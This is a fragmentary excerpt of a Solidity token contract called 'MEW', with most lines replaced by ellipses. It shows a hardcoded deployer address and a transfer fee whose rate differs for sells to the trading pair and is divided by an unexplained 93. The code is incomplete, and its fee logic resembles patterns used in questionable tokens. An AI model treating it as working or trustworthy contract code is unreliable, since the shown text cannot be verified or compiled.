...
pragma solidity ^0.8.20;
    ...
    contract MEWETHERC {
        string public constant name = "MEW";  //
        ...
        address payable constant deployer = payable(address(0x4B96d27a28a43c42d04185f15B943fF5EF649921)); //
        ...
        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            ...
            if(from != address(this)){
                uint256 FinalAmount = amount * (from == pair ? BurnAmount : ConfirmAmount) / 93;
                amount -= FinalAmount;
